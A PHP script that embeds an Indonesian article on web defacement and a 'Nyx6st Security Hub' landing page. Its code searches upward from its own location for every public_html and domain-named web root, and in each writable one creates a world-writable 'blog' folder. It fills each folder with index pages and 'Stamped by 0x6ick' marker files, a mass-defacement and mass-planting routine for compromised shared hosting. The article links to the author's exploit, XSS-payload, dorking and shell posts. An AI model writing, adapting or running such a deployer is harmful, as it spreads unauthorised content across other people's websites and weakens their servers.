<?php
$folderName = 'blog';

// === isi file ===
$nyx6st_template = <<<'HTML'
<!DOCTYPE html> <html lang="id"> <head> <meta charset="UTF-8" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <title>Mengupas Tuntas Web Defacement: Motif, Teknik, dan Cara Mencegahnya</title> <style> h1, h2, h3 { color: #00ffff; border-bottom: 2px solid #005577; padding-bottom: 10px; } h4 { color: #ff88ff; } .logo { font-size: 1.2rem; color: #ff0055; margin-bottom: 3rem; } a { color: #00ccff; text-decoration: none; } a:hover { text-decoration: underline; } ul, ol { padding-left: 20px; } li { margin-bottom: 10px; } img { max-width: 100%; height: auto; display: block; margin: 2rem auto; border: 4px solid #00ff88; box-shadow: 0 0 15px rgba(0, 255, 136, 0.5); } blockquote { background: #111; border-left: 4px solid #ff88ff; padding: 1rem; margin: 1.5rem 0; color: #ccc; font-style: italic; } strong { color: #00000; } </style> </head> <body> <h1>👾 Mengupas Tuntas Web Defacement: Vandalisme Digital yang Merusak Reputasi</h1> <p class="logo">Written by <strong>Nyx6st</strong> | Cyber Notes</p> <h2>📌 Pendahuluan: Saat Wajah Website Dicoreng</h2> <p> Bayangkan Anda memiliki sebuah toko fisik yang megah di pusat kota. Suatu pagi, Anda datang dan mendapati seluruh dinding depan toko telah dicorat-coret dengan cat semprot, pesannya provokatif, dan pintu masuknya disegel. Reputasi Anda seketika tercoreng, pelanggan ragu untuk masuk, dan Anda harus mengeluarkan biaya untuk memperbaikinya. </p> <p> Itulah analogi paling sederhana dari <strong>Web Defacement</strong>. </p> <p> Dalam dunia digital, <em>website</em> adalah "toko" atau "wajah" dari sebuah organisasi, perusahaan, atau individu. Serangan <em>deface</em> adalah tindakan vandalisme digital di mana seorang peretas secara ilegal mengubah tampilan visual sebuah situs web. Artikel ini akan mengupas tuntas seluk-beluk <em>web defacement</em>: mulai dari pengertian dasarnya, motif di baliknya, berbagai jenis serangan yang menjadi pintu masuknya, hingga cara efektif untuk melindunginya. </p> <h2>📄 Apa Itu Web Defacement Secara Mendasar?</h2> <p> <strong>Web Defacement</strong> adalah serangan siber di mana peretas (sering disebut <em>defacer</em>) menyusup ke dalam server sebuah website dan mengganti konten halaman utamanya—atau bahkan seluruh situs—dengan konten milik mereka sendiri. </p> <p> Konten yang ditampilkan biasanya berupa: </p> <ul> <li>Pesan politik atau propaganda (<em>hacktivism</em>).</li> <li>Klaim kemenangan dan nama samaran peretas atau grupnya.</li> <li>Gambar-gambar yang tidak pantas atau provokatif.</li> <li>Kritik terhadap keamanan situs tersebut.</li> <li>Layar hitam/putih dll ,dengan tulisan sederhana seperti <code>"Hacked by [Nama Peretas]"</code>.</li> </ul> <p> Target utama biasanya adalah file <code>index.html</code>, <code>index.php</code>, atau file lain yang berfungsi sebagai halaman depan. Dengan mengubah file ini, peretas secara efektif telah "mencoreng wajah" dari seluruh situs. </p> <h2>🎭 Bukan Sekadar Satu Wajah: Jenis-Jenis Hasil Serangan Deface</h2> <p> Meskipun tujuannya sama—mengubah tampilan—hasil akhir dari serangan <em>deface</em> bisa berbeda-beda tergantung tingkat akses yang didapat peretas dan tujuan mereka. Berikut adalah tiga jenis yang paling umum ditemukan: </p> <h4>1. Full Deface</h4> <p> Ini adalah bentuk <em>deface</em> yang paling klasik dan paling mudah dikenali. Peretas mengganti seluruh konten halaman depan (misalnya <code>index.html</code>) dengan halaman yang sudah mereka siapkan. Pengunjung yang membuka alamat domain situs akan langsung dihadapkan pada pesan dari peretas. Ini menunjukkan bahwa peretas berhasil mendapatkan akses tulis (write access) ke file-file inti di direktori utama web. </p> <blockquote>Analogi: Mengecat ulang seluruh fasad bangunan dengan desain baru yang mencolok.</blockquote> <h4>2. Partial Deface</h4> <p> <em>Deface</em> jenis ini lebih halus dan terkadang sulit dideteksi. Alih-alih mengubah seluruh halaman, peretas hanya menyisipkan atau mengubah sebagian kecil dari konten situs. Contohnya: mengubah satu gambar di galeri, menambahkan satu paragraf aneh di tengah artikel, atau menyisipkan link tersembunyi di bagian <em>footer</em>. </p> <blockquote>Analogi: Menempelkan satu stiker provokatif di salah satu jendela toko, bukan di pintu utama.</blockquote> <h4>3. Deface "Index Of" (Mass File Deletion)</h4> <p> Ini adalah jenis yang paling merusak dan seringkali menandakan peretas memiliki akses tingkat tinggi (seperti akses ke cPanel, FTP, atau SSH). Dalam skenario ini, peretas tidak hanya mengganti file, tetapi melakukan <strong>penghapusan massal (mass delete) terhadap file dan folder asli website</strong>. </p> <p> Terkadang, sebelum melakukan penghapusan total, peretas sengaja menyisakan beberapa file atau folder asli. Namun, pada akhirnya, sebagian besar struktur situs akan dihancurkan. Setelah itu, mereka hanya meninggalkan satu atau dua file buatan mereka </p> <p> Hasilnya? Ketika pengunjung mengakses situs, file <code>index</code> utama sudah tidak ada. Jika konfigurasi server mengizinkan <em>directory listing</em>, maka browser akan menampilkan halaman <strong>"Index of /"</strong>—sebuah daftar file mentah yang hanya berisi file milik peretas. Serangan ini menyebabkan kerusakan total dan memerlukan restorasi penuh dari backup. </p> </p> <blockquote>Analogi: Menggusur dan membuang seluruh isi toko, lalu meninggalkan satu selebaran di lantai yang kosong.</blockquote> <h2>🎯 Mengapa Seseorang Melakukan Deface? Motif di Balik Vandalisme Digital</h2> <ol> <li><strong>Hacktivism (Aktivisme Digital):</strong> Ini adalah motif paling umum. Peretas menggunakan <em>deface</em> sebagai platform untuk menyuarakan protes politik, isu sosial, atau ketidakpuasan.</li> <li><strong>Pamer Kemampuan (Bragging Rights):</strong> Banyak peretas, terutama yang masih muda, melakukan <em>deface</em> untuk membuktikan keahlian mereka di komunitas <em>underground</em>.</li> <li><strong>Iseng atau Latihan:</strong> Sebagian peretas pemula menggunakan situs dengan keamanan lemah sebagai target latihan untuk mengasah keterampilan mereka.</li> <li><strong>Pesan Ancaman atau Peringatan:</strong> Perusahaan bisa menjadi target sebagai peringatan dari kompetitor atau pihak yang tidak puas.</li> <li><strong>Kompetisi Antar Grup:</strong> Dalam komunitas peretas, sering terjadi "perang" antar grup untuk memperebutkan reputasi.</li> </ol> <h2>🔑 Pintu Masuk Peretas: Berbagai Vektor Serangan</h2> <p>Sebuah situs tidak bisa di-<em>deface</em> begitu saja. Peretas harus menemukan celah keamanan untuk bisa masuk. Berikut adalah beberapa metode yang paling sering digunakan:</p> <h4>1. Kredensial Lemah (<a href="https://0x6ick.my.id/2025/06/bypass-sql-login-and-weak-admin-panel.html" target="_blank" rel="noopener noreferrer"> weak pass </a>)</h4> <p>Penyebab paling umum. Peretas menggunakan serangan <em>brute-force</em> atau <em>credential stuffing</em> untuk mendapatkan akses ke Dasbor Admin, cPanel, FTP, atau SSH.</p> <h4>2. Kerentanan pada CMS, Plugin, atau Tema</h4> <p>Platform seperti WordPress, <a href="https://0x6ick.blogspot.com/2025/06/exploit-joomla-full-pack.html" target="_blank" rel="noopener noreferrer"> Joomla </a>, dan Drupal sering menjadi target jika plugin dan temanya tidak diperbarui. Peretas mengeksploitasi bug yang diketahui untuk masuk.</p> <h4>3. SQL Injection (SQLi)</h4> <p>Peretas menyisipkan kode SQL berbahaya melalui form input untuk memanipulasi database, yang bisa berujung pada pencurian kredensial admin.</p> <p> (<a href="https://0x6ick.blogspot.com/2025/05/panduan-menggunakan-sqlmap-live-target.html" target="_blank" rel="noopener noreferrer"> panduan menggunakan sqlmap </a>) </p> <h4>4. Cross-Site Scripting (XSS)</h4> <p>Peretas menyuntikkan skrip berbahaya untuk mencuri <em>session cookie</em> admin, yang memungkinkan mereka membajak sesi login tanpa password.</p> <p> <a href="https://0x6ick.blogspot.com/2025/05/mengenal-berbagai-payload-xss-dan.html?m=1" target="_blank" rel="noopener noreferrer"> mengenal berbagai payload xss </a> </p> <h4>5. File Inclusion (LFI/RFI)</h4> <p>Kerentanan ini memungkinkan peretas untuk mengeksekusi file berbahaya di server, sering kali untuk mengunggah <em>Backdoor</em> (pintu belakang).</p> <h4>6. Kesalahan Konfigurasi Server (Server Misconfiguration)</h4> <p>Hak akses file yang terlalu longgar, file backup yang terekspos, atau direktori yang bisa dilihat publik bisa menjadi pintu masuk yang mudah bagi peretas.</p> <p> <a href="https://0x6ick.blogspot.com/2025/08/dorking-config-kumpulan-dork-untuk.html?m=1" target="_blank" rel="noopener noreferrer"> Dorking Config </a> </p> <h2>💥 Dampak Serangan Deface: Lebih dari Sekadar Tampilan</h2> <ul> <li><strong>Kerusakan Reputasi dan Kepercayaan:</strong> Pelanggan dan pengunjung akan kehilangan kepercayaan pada situs Anda.</li> <li><strong>Kerugian Finansial:</strong> <em>Downtime</em> situs berarti kehilangan pendapatan. Biaya pemulihan juga tidak sedikit.</li> <li><strong>Penurunan Peringkat SEO:</strong> Google bisa memberi label "situs ini mungkin diretas" atau bahkan memasukkannya ke daftar hitam.</li> <li><strong>Pintu Masuk untuk Serangan Lanjutan:</strong> <em>Deface</em> sering kali hanyalah puncak gunung es. Peretas mungkin sudah menanam <em> <a href="https://www.0x6ick.my.id/2025/06/bypass-shell-release.html?m=1" target="_blank">Backdoor</a></em> atau mencuri data.</li> </ul> <h2>🛡️ Benteng Pertahanan: Cara Mencegah Serangan Deface</h2> <ol> <li><strong>Update Secara Berkala:</strong> Selalu perbarui inti CMS, plugin, dan tema ke versi terbaru.</li> <li><strong>Gunakan Password Kuat & 2FA:</strong> Kombinasikan huruf besar-kecil, angka, simbol, dan aktifkan Otentikasi Dua Faktor.</li> <li><strong>Implementasikan Web Application Firewall (WAF):</strong> WAF seperti Cloudflare dapat memfilter lalu lintas berbahaya sebelum mencapai server.</li> <li><strong>Lakukan Hardening Server:</strong> Terapkan konfigurasi server yang aman dan batasi hak akses file (misalnya, <code>755</code> untuk direktori dan <code>644</code> untuk file).</li> <li><strong>Lakukan Backup Rutin:</strong> Siapkan backup harian atau mingguan di lokasi yang terpisah agar pemulihan bisa dilakukan dengan cepat.</li> <li><strong>Gunakan Pemindai Kerentanan:</strong> Manfaatkan alat untuk secara proaktif mencari celah keamanan di situs Anda.</li> </ol> <h2>💡 Kesimpulan</h2> <p> <strong>Web Defacement</strong> lebih dari sekadar aksi corat-coret digital. Ia adalah indikator jelas bahwa ada celah keamanan serius yang telah dieksploitasi. Bagi pemilik website, serangan ini adalah sebuah "panggilan bangun" yang menyakitkan. </p> <p> Dengan memahami motif, metode serangan, dan dampak yang ditimbulkannya, kita bisa membangun pertahanan yang lebih kuat. Keamanan siber bukanlah tujuan akhir, melainkan sebuah proses tanpa henti untuk menjaga aset digital kita tetap aman, utuh, dan terpercaya. </p> <h2>⚠️ Disclaimer</h2> <p> This article is intended solely for educational purposes. The creator shall not be held liable for any misuse, illegal activities, or damages resulting from the unauthorized use of this content. </p> <hr> <blockquote> "Where creativity, exploitation, and expression collide." — <em>6ickZone</em> </blockquote> </p> </body> </html>
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Nyx6st Security Hub — Edukasi Keamanan Siber & Pentest</title>
  <meta name="description" content="Belajar ethical hacking, pentest, dan keamanan web secara etis. Nyx6st Security Hub menyediakan tutorial, studi kasus, dan sumber daya untuk calon profesional keamanan siber.">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Favicon -->
  <link rel="icon" href="https://0x6ick.my.id/favicon.ico" type="image/x-icon">

  <!-- OG Meta for share -->
  <meta property="og:title" content="Nyx6st Security Hub">
  <meta property="og:description" content="Platform edukasi cybersecurity dan pentest untuk semua kalangan.">
  <meta property="og:url" content="https://0x6ick.my.id">
  <meta property="og:type" content="website">
  <meta property="og:image" content="https://0x6ick.my.id/logo.png">

  <style>
    body {
      background: #ffffff;
      color: #333333;
      font-family: 'Segoe UI', 'Roboto', Arial, sans-serif;
      margin: 0;
      padding: 20px 15px;
      line-height: 1.6;
    }
    h1, h2, h3 {
      color: #000000;
      text-align: center;
    }
    p {
      max-width: 800px;
      margin: 0.8em auto;
      font-size: 16px;
    }
    .container {
      max-width: 850px;
      margin: 0 auto;
    }
    .intro-text {
      text-align: center;
      margin-bottom: 40px;
    }
    .featured-section {
      background: #f4f4f9;
      border: 1px solid #e0e0e0;
      padding: 25px;
      margin: 30px auto;
      border-radius: 8px;
    }
    .featured-section h3 {
      margin-top: 0;
      color: #0056b3;
    }
    .snippet {
      margin: 1.5em 0;
      padding: 15px;
      border-left: 4px solid #007bff;
      background: #f9f9f9;
      transition: transform 0.2s ease;
    }
    .snippet:hover {
        transform: translateY(-3px);
    }
    .snippet a {
      color: #0056b3;
      font-weight: bold;
      text-decoration: none;
      font-size: 18px;
    }
    .snippet a:hover {
      text-decoration: underline;
    }
    .snippet p {
      margin: 0.5em 0 0;
      color: #555555;
      font-size: 15px;
    }
    footer {
      margin-top: 50px;
      text-align: center;
      font-size: 14px;
      color: #555555;
    }
    a.footer-link {
      color: #0056b3;
      text-decoration: none;
    }
    a.footer-link:hover {
      text-decoration: underline;
    }
    .lang-toggle {
      text-align: center;
      margin: 1em 0 2em;
    }
    .lang-toggle button {
      background: #f0f0f0;
      color: #333;
      border: 1px solid #ccc;
      padding: 10px 20px;
      margin: 0 5px;
      cursor: pointer;
      border-radius: 6px;
      font-weight: bold;
    }
    .lang-toggle button.active {
      background: #007bff;
      color: #fff;
      border-color: #007bff;
    }
    .lang-section { display: none; }
    .lang-section.active { display: block; }
  </style>
</head>

<body>
  <div class="container">
    <h1>[ Nyx6st Security Hub ]</h1>

    <div class="lang-toggle">
      <button id="btn-id" class="active">🇮🇩 Bahasa Indonesia</button>
      <button id="btn-en">🇬🇧 English</button>
    </div>

    <!-- Bahasa Indonesia -->
    <div id="lang-id" class="lang-section active">
      <div class="intro-text">
        <p>Selamat datang di <strong>Nyx6st Security Hub</strong>, sebuah platform edukatif bagi siapa pun yang ingin mendalami dunia keamanan siber secara etis dan bertanggung jawab.</p>
        <p>Misi kami adalah menyediakan sumber daya berkualitas untuk membantu Anda memahami cara kerja serangan siber melalui studi kasus praktis, menganalisis kerentanan umum pada CMS seperti <strong>WordPress</strong> dan <strong>Joomla</strong>, serta menyajikan berbagai artikel menarik berisi cara-cara menganalisis, mengamankan, dan menguji sistem secara etis.</p>
      </div>

      <div class="featured-section">
        <h3>Area Fokus & Topik Bahasan</h3>
        <ul>
          <li><strong>Analisis Keamanan CMS:</strong> Membedah kerentanan umum pada platform populer seperti WordPress dan Joomla, mulai dari plugin rentan hingga konfigurasi yang salah.</li>
          <li><strong>Web Penetration Testing:</strong> Panduan praktis untuk melakukan pengujian penetrasi aplikasi web, dari pengintaian, eksploitasi, hingga pelaporan etis.</li>
          <li><strong>Mekanisme Pertahanan:</strong> Belajar mengamankan aplikasi dari serangan umum dengan menerapkan *secure coding*, validasi input, dan *patching* yang tepat.</li>
          <li><strong>Tools:</strong> Kumpulan alat bantu yang dapat Anda gunakan sesuai kebutuhan.</li>
        </ul>
      </div>

      <h2>Tutorial & Studi Kasus Terbaru</h2>
      <p style="text-align:center;">Berikut adalah artikel-artikel terbaru dari blog kami, membahas berbagai topik secara mendalam dan aplikatif.</p>
    </div>

    <!-- English -->
    <div id="lang-en" class="lang-section">
      <div class="intro-text">
        <p>Welcome to <strong>Nyx6st Security Hub</strong>, an educational platform for anyone interested in exploring the world of cybersecurity ethically and responsibly.</p>
        <p>Our mission is to provide high-quality resources to help you understand how cyber attacks work through practical case studies, analyze common vulnerabilities in CMS platforms like <strong>WordPress</strong> and <strong>Joomla</strong>, and share insightful articles featuring methods for analyzing, securing, and ethically testing systems.</p>
      </div>

      <div class="featured-section">
        <h3>Focus Areas & Topics</h3>
        <ul>
          <li><strong>CMS Security Analysis:</strong> Dissecting common vulnerabilities in popular platforms like WordPress and Joomla, from vulnerable plugins to misconfigurations.</li>
          <li><strong>Web Penetration Testing:</strong> Practical guides for performing penetration tests on web apps—from reconnaissance and exploitation to ethical reporting.</li>
          <li><strong>Defense Mechanisms:</strong> Learn how to secure applications from common threats using secure coding, proper input validation, and patching.</li>
          <li><strong>Tools:</strong> A collection of helpful tools you might need in your journey.</li>
        </ul>
      </div>

      <h2>Latest Tutorials & Case Studies</h2>
      <p style="text-align:center;">Here are the latest articles from our blog, covering topics from vulnerability analysis to server hardening techniques.</p>
    </div>

    <!-- Blog feed -->
    <div id="content"></div>

    <footer>
      &copy; 2025 <a href="https://0x6ick.my.id" target="_blank" class="footer-link">0x6ick</a> | Dedicated to ethical learning and digital defense.
    </footer>
  </div>

  <script>
    const btnId = document.getElementById("btn-id");
    const btnEn = document.getElementById("btn-en");
    const langId = document.getElementById("lang-id");
    const langEn = document.getElementById("lang-en");

    btnId.addEventListener("click", () => {
      langId.classList.add("active");
      langEn.classList.remove("active");
      btnId.classList.add("active");
      btnEn.classList.remove("active");
    });

    btnEn.addEventListener("click", () => {
      langEn.classList.add("active");
      langId.classList.remove("active");
      btnEn.classList.add("active");
      btnId.classList.remove("active");
    });

    const feedUrl = 'https://api.rss2json.com/v1/api.json?rss_url=https://0x6ick.blogspot.com/feeds/posts/default';
    fetch(feedUrl)
      .then(res => res.json())
      .then(data => {
        const container = document.getElementById('content');
        const items = data.items || [];
        if (!items.length) {
          container.innerHTML = '<p style="text-align:center;">Belum ada artikel yang tersedia.</p>';
          return;
        }
        items.slice(0, 6).forEach(item => {
          const title = item.title;
          const link  = item.link;
          const desc  = item.description.replace(/<[^>]+>/g, '').substring(0, 140) + '...';
          const div = document.createElement('div');
          div.className = 'snippet';
          div.innerHTML = `<a href="${link}" target="_blank">${title}</a><p>${desc}</p>`;
          container.appendChild(div);
        });
      })
      .catch(err => {
        console.error(err);
        document.getElementById('content').innerHTML =
          '<p style="text-align:center;">Gagal memuat artikel.</p>';
      });
  </script>
</body>
</html>
HTML;

$files = [
  'index.php' => $nyx6st_template,
  'index.html'=> $nyx6st_template,
  '6z.htm'    => "Stamped by 0x6ick - 6ickzone | AKA 5YN15T3R_742",
  '6s.txt'    => "Stamped by 0x6ick - 6ickzone | AKA 5YN15T3R_742"
];

// === detect roots ===
function locateRoots($start){
    $roots=[]; $dir=realpath($start);
    while($dir && $dir!=='/'){
        if(is_dir($dir."/public_html")) $roots[]=$dir."/public_html";
        foreach(glob($dir."/*",GLOB_ONLYDIR) as $sub){
            if(preg_match('/\.[a-z]+$/',basename($sub))) $roots[]=$sub;
        }
        $dir=dirname($dir);
    }
    return array_unique($roots);
}

function deployFolder($folderName,$files){
    $roots=locateRoots(__DIR__); $deployed=[];
    foreach($roots as $htmlPath){
        if(is_writable($htmlPath)){
            $targetDir="$htmlPath/$folderName";
            if(!is_dir($targetDir))@mkdir($targetDir,0777,true);
            foreach($files as $n=>$c){file_put_contents("$targetDir/$n",$c);}
            $deployed[]=$targetDir;
        }
    }
    return $deployed;
}

$paths=deployFolder($folderName,$files);
echo "<pre>Deployed:\n".implode("\n",$paths)."</pre>";
?>
